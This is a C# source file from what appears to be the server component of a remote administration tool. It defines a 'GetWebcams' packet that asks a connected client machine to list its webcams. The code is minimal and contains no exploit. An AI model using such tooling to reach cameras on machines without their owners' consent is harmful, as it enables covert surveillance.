using System;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ServerPackets
{
    [Serializable]
    public class GetWebcams : IPacket
    {
        public GetWebcams()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}